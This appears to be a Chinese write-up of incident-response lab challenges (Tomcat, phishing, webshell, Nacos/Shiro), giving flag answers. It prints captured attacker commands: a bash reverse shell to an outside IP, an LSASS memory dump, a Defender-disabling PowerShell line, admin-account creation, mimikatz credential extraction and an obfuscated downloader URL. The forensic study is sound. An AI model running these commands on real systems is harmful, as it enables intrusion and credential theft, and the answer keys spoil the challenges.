<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/a6771054d8a59c8b5659e0a824e0c39c--05e3--image-20240614180853189.png" alt="image-20240614180853189"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;write_flag&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务六-2"><a href="#任务六-2" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客下载了哪个文件，提交文件绝对路径</span><br></pre></td></tr></table></figure>

<p>最后一个http请求包中可以找到</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/45047d9be713a07b3417c15a8e1e1c68--5a71--image-20240614181441944.png" alt="image-20240614181441944"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/www/html/config.php&#125;</span><br></pre></td></tr></table></figure>

<p>这道题完全就是http流量分析</p>
<h2 id="常见攻击事件-tomcat"><a href="#常见攻击事件-tomcat" class="headerlink" title="常见攻击事件 tomcat"></a>常见攻击事件 tomcat</h2><h4 id="任务一-16"><a href="#任务一-16" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag&#123;ip&#125;，如：flag&#123;127.0.0.1&#125;</span><br></pre></td></tr></table></figure>

<p>能够发现大量的SYN的包，nmap的扫描就是SYN，所以也就能够得到ip</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-14/d0d6a6f1c647d455e00ab6632a68a43d--c187--image-20240614235450104.png" alt="image-20240614235450104"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;14.0.0.120&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-15"><a href="#任务二-15" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag&#123;城市英文小写&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是信息收集的知识，我们直接查ip首先就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;guangzhou&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/59428c6cec380c850951c89ebe2cf20d--37e6--image-20240615000628313.png" alt="image-20240615000628313"></p>
<h4 id="任务三-15"><a href="#任务三-15" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哪一个端口提供对web服务器管理面板的访问？ flag格式：flag&#123;2222&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是过滤出来http的</p>
<p>随便追踪一个http流，就知道对应的端口了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/d4ce1f4a80d1e368e18c404949b41db6--473c--image-20240615000805842.png" alt="image-20240615000805842"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;8080&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-15"><a href="#任务四-15" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag&#123;名称&#125;</span><br></pre></td></tr></table></figure>

<p>这里就可以通过去分析UA头即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/88feeb1ce33b8c1e1cb1a9b2ab2e4812--71d3--image-20240615000941609.png" alt="image-20240615000941609"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;gobuster&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-10"><a href="#任务五-10" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag&#123;root-123&#125;</span><br></pre></td></tr></table></figure>

<p>一般登录请求都是采用post请求，我们就找post方法即可</p>
<p>很容易就能找到</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/aecf689150a1d113a363756aff218257--472c--image-20240615002118674.png" alt="image-20240615002118674"></p>
<p>发现权限验证，猜测应该是base64编码，我们解码一下</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/af2583d56bbbb4457f15019969dfef97--9358--image-20240615002155451.png" alt="image-20240615002155451"></p>
<p>成功获得账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin-tomcat&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务六-3"><a href="#任务六-3" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag&#123;114514.txt&#125;</span><br></pre></td></tr></table></figure>

<p>还是就是在上面的post包里面，直接就是有的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/8cf7bae73b246dcad4f740d032c924eb--c6df--image-20240615002713403.png" alt="image-20240615002713403"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;JXQOZY.war&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务七-1"><a href="#任务七-1" class="headerlink" title="任务七"></a>任务七</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息</span><br></pre></td></tr></table></figure>

<p>通过跟踪流9461能够发现一个反弹shell的权限维持</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/5df4a904db283d640a2e57fbbb28c7c2--7c87--image-20240615003527468.png" alt="image-20240615003527468"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/14.0.0.120/443 0&gt;&amp;1&#x27;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小王公司收到的钓鱼邮件"><a href="#小王公司收到的钓鱼邮件" class="headerlink" title="小王公司收到的钓鱼邮件"></a>小王公司收到的钓鱼邮件</h2><h4 id="任务一-17"><a href="#任务一-17" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag&#123;xxxx.co.xxxx/w0ks//?YO=xxxxxxx&#125;） (无需 http、https)；</span><br></pre></td></tr></table></figure>

<p>很容易就能够发现的这个，直接就是过滤出来http包就有了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/8ee01b0d7ccc3cf93608a798f08353c2--1f0d--image-20240615200459366.png" alt="image-20240615200459366"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;tsdandassociates.co.sz/w0ks//?YO=1702920835&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-16"><a href="#任务二-16" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag&#123;md5&#125;）；</span><br></pre></td></tr></table></figure>

<p>直接就是在返回包中吧压缩包下载下来改下后缀</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/e2237acfb411fa4e92414ad6f470ce49--20c5--image-20240615201106892.png" alt="image-20240615201106892"></p>
<p>然后去计算一下md5值就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;F17DC5B1C30C512137E62993D1DF9B2F&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-16"><a href="#任务三-16" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag&#123;域名&#125;(无需 http、https)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/5aa6de01d72e7033377a68f72a1854b7--e7ec--image-20240615201237513.png" alt="image-20240615201237513"></p>
<p>很明显的就是能够看到有各种字符，感觉应该就是拼接</p>
<p>其中一段如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o457607380 = &#x27;&#x27;;</span><br><span class="line">o457607380+=&#x27;h&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;p&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;:&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;h&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;k&#x27;;</span><br><span class="line">o457607380+=&#x27;y&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;u&#x27;;</span><br><span class="line">o457607380+=&#x27;e&#x27;;</span><br><span class="line">o457607380+=&#x27;s&#x27;;</span><br><span class="line">o457607380+=&#x27;t&#x27;;</span><br><span class="line">o457607380+=&#x27;r&#x27;;</span><br><span class="line">o457607380+=&#x27;a&#x27;;</span><br><span class="line">o457607380+=&#x27;d&#x27;;</span><br><span class="line">o457607380+=&#x27;e&#x27;;</span><br><span class="line">o457607380+=&#x27;.&#x27;;</span><br><span class="line">o457607380+=&#x27;c&#x27;;</span><br><span class="line">o457607380+=&#x27;o&#x27;;</span><br><span class="line">o457607380+=&#x27;m&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;A&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;F&#x27;;</span><br><span class="line">o457607380+=&#x27;/&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;1&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;2&#x27;;</span><br><span class="line">o457607380+=&#x27;3&#x27;;</span><br><span class="line">o457607380+=&#x27;1&#x27;;</span><br><span class="line">o457607380+=&#x27;6&#x27;;</span><br><span class="line">o457607380+=&#x27;0&#x27;;</span><br><span class="line">o457607380+=&#x27;3&#x27;;</span><br><span class="line">l988241708 = &#x27;&#x27;;</span><br><span class="line">l988241708+=&#x27;q&#x27;;</span><br><span class="line">l988241708+=&#x27;u&#x27;;</span><br><span class="line">l988241708+=&#x27;i&#x27;;</span><br><span class="line">l988241708+=&#x27;.&#x27;;</span><br><span class="line">l988241708+=&#x27;q&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shakyastatuestrade.com/A6F/616231603</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;shakyastatuestrade.com&#125;</span><br></pre></td></tr></table></figure>

<h2 id="waf-上的截获的黑客攻击流量"><a href="#waf-上的截获的黑客攻击流量" class="headerlink" title="waf 上的截获的黑客攻击流量"></a>waf 上的截获的黑客攻击流量</h2><h4 id="任务一-18"><a href="#任务一-18" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客成功登录系统的密码 flag&#123;xxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是可以直接过滤出来http的post请求，然后就去找登录的账号密码，由于前面的数据都是进行对应账号的寻找的，没什么用，所以我们从后边去开始找就行</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/a06728ba29423f3003cccc2d949d495f--03dc--image-20240615210444170.png" alt="image-20240615210444170"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin!@#pass123&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-17"><a href="#任务二-17" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客发现的关键字符串 flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>说实话这个是真的不知道有啥启发式搜索去找到flag</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/c01c40d9e39dadfafbd9689ca1707e44--f411--image-20240615211323254.png" alt="image-20240615211323254"></p>
<p>找到一个flag，但发现是错误的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/63bef376e0935aa8082313ce2ebed501--21c6--image-20240615211716126.png" alt="image-20240615211716126"></p>
<p>发现这个才是正确的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;87b7cb79481f317bde90c116cf36084b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-17"><a href="#任务三-17" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客找到的数据库密码 flag&#123;xxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是过滤搜索database即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/20ae209786ad80988c1e7f017fb0556b--3393--image-20240615211931634.png" alt="image-20240615211931634"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;e667jUPvJjXHvEUv&#125;</span><br></pre></td></tr></table></figure>

<h2 id="蚂蚁爱上树"><a href="#蚂蚁爱上树" class="headerlink" title="蚂蚁爱上树"></a>蚂蚁爱上树</h2><h4 id="任务一-19"><a href="#任务一-19" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">管理员Admin账号的密码是什么？</span><br></pre></td></tr></table></figure>

<p>直接就是打开流量包，因为要找的是账号密码，这个时候我们肯定首先就是想到的http的post请求包</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/cdf1ef9f9cfca2fde92b375b822afc17--3674--image-20240616195528873.png" alt="image-20240616195528873"></p>
<p>我们发现在&#x2F;onlineshop&#x2F;product2.php这个路由中post传递了很多base64加密后的数据</p>
<p>我们就依次去分析即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/d4495333b9913add0175063ea62f0d2a--34d3--image-20240616200019409.png" alt="image-20240616200019409"></p>
<p>将所有的找出来解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:/phpStudy/PHPTutorial/WWW/onlineshop/database/onlineshop.sql</span><br><span class="line">cd /d “C:/phpStudy/PHPTutorial/WWW/onlineshop”&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;whoami /priv&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;systeminfo&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net localgroup administrators&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net group “domain group” /domain&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net group “domain admins” /domain&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net view&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net share&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”© store.php c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;powershell -ep bypass Set-Mppreference -DisableRaltimeMonitoring $true&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">C:/Temp/OnlineShopBack.zip</span><br><span class="line">cd /d “C:/phpStudy/PHPTutorial/WWW/onlineshop”&amp;dir c:\windows\system32&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;dir c:\windows\config&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net localgroup administrators admin /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;whoami /all&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也能够很明显的发现账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Password1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-18"><a href="#任务二-18" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LSASS.exe的程序进程ID是多少？</span><br></pre></td></tr></table></figure>

<p>这个上面中也查到了的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /d “C:\phpStudy\PHPTutorial\WWW\onlineshop”&amp;rundll32.exe comsvcs.dll, MiniDump 852</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;852&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-18"><a href="#任务三-18" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户WIN101的密码是什么?</span><br></pre></td></tr></table></figure>

<p>上面的解密，我们发现有个OnlineShopBackup.zip压缩包，我们将之导出首先就是</p>
<p>找到<code>47MB</code>的导出分组字节流<code>product2.php</code> 因为是蚁剑流量所以会有多余字节，删除即可。多余字节 <code>e1c1709</code> 加载<code>mimiktz</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump 1.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/6003727fd148299a13936777db0630f6--4681--image-20240616201345735.png" alt="image-20240616201345735"></p>
<p>然后拿到NTLM值，直接尝试md5解密即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/fdd4c4e1436ec54e56d53e0a8465188e--925e--image-20240616201434726.png" alt="image-20240616201434726"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin#123&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第七章-常见攻击事件分析"><a href="#第七章-常见攻击事件分析" class="headerlink" title="第七章 常见攻击事件分析"></a>第七章 常见攻击事件分析</h1><h2 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h2><h4 id="任务一-20"><a href="#任务一-20" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag&#123;11.22.33.44&#125;</span><br></pre></td></tr></table></figure>

<p>通常情况下最后一个Received部分可能会显示真实发件ip地址</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-21/4cae01e990d3fb1ddbd1b9696e681567--3895--image-20240621221525817.png" alt="image-20240621221525817"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;121.204.224.15&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-19"><a href="#任务二-19" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag&#123;11.22.33.44&#125;</span><br></pre></td></tr></table></figure>

<p>将base64加密的数据解密导出成zip文件，就能获得对应的恶意exe文件，这个时候就可以将这个恶意文件找一个在线沙箱丢进去监测一下</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-21/890e619c24cae5450794469cf636ecca--f1a8--image-20240621222708562.png" alt="image-20240621222708562"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;107.16.111.57&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-19"><a href="#任务三-19" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag&#123;/var/www/html/shell.php&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是将对应的web目录丢进d盾中去进行检测即可</p>
<p>直接就是找到对应的后门文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/www/html/admin/ebak/ReData.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-16"><a href="#任务四-16" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag&#123;/opt/apache2/shell&#125;</span><br></pre></td></tr></table></figure>

<p>发现就是还给了个tmp文件夹，我们就是直接去查看一下这个里面的内容</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-21/ea37a05ef4a2c929d73479183cd3c119--96a7--image-20240621223352617.png" alt="image-20240621223352617"></p>
<p>发现创建了socks，所以就是使用mysql去搭建对应的内网隧道</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/tmp/proc/mysql&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第八章-内存马分析"><a href="#第八章-内存马分析" class="headerlink" title="第八章 内存马分析"></a>第八章 内存马分析</h1><h2 id="java01-nacos"><a href="#java01-nacos" class="headerlink" title="java01-nacos"></a>java01-nacos</h2><h4 id="任务一-21"><a href="#任务一-21" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nacos 用户密码的密文值作为 flag 提交 flag&#123;密文&#125;</span><br></pre></td></tr></table></figure>

<p>首先就是根据题目要求我们去启动 &#x2F;var&#x2F;local&#x2F;下的 autorun.sh即可正常启</p>
<p>然后就发现了在nacos中有对应的配置文件，这个时候我们就可以去看看有什么配置文件，发现mysql的配置文件，猜测里面可能会有密码</p>
<p>我们就直接去读取一下看看</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/e38bfb3b208a4321047a70ac0eab5b45--896f--image-20240702201530059.png" alt="image-20240702201530059"></p>
<p>发现密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-20"><a href="#任务二-20" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiro 的key为多少 shiro 的 key 请记录下来 （请记录下来，会有用d）</span><br></pre></td></tr></table></figure>

<p>我们在nacos目录下还发现了一个nacos_config_ex…..zip的文件，我们可以下载到本地去查看一下</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/cb1b06c2cb97d82a962ac522236996a8--066f--image-20240702201805701.png" alt="image-20240702201805701"></p>
<p>成功找到key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;KduO0i+zUIMcNNJnsZwU9Q==&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-20"><a href="#任务三-20" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机内核版本为 flag&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>直接上命令就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -r 或 uname -a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5.4.0-164-generic&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-17"><a href="#任务四-17" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 &lt;此题flag不正确无法ti&#x27;j&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/95d3973d099fccf698f83c3173531302--819a--image-20240702202209018.png" alt="image-20240702202209018"></p>
<p>发现是错误的这个是</p>
<p>我们可以先查看一下&#x2F;etc&#x2F;passwd</p>
<p>发现存在两个uid为0的用户，猜测应该是黑客的账户，我们使用后userdel去删除用户</p>
<p>发现此用户正在运行一些服务，无法删除。<br>直接修改 <code>/etc/passwd</code> 文件进行删除</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/a0bb213fecb80dc4b959f3ef4640e16d--eb54--image-20240702202809499.png" alt="image-20240702202809499"></p>
<h4 id="任务五-11"><a href="#任务五-11" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试修复 nacos 并且自行用 poc 测试是否成功 此题无flag</span><br></pre></td></tr></table></figure>

<p><a href="https://cn-sec.com/archives/2811865.html">https://cn-sec.com/archives/2811865.html</a>  参考链接</p>
<h2 id="java02-shiro"><a href="#java02-shiro" class="headerlink" title="java02-shiro"></a>java02-shiro</h2><h4 id="任务一-22"><a href="#任务一-22" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将 shiro 的 key 作为 flag 提交</span><br></pre></td></tr></table></figure>

<p>也就是上一题的key即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;KduO0i+zUIMcNNJnsZwU9Q==&#125;</span><br></pre></td></tr></table></figure>

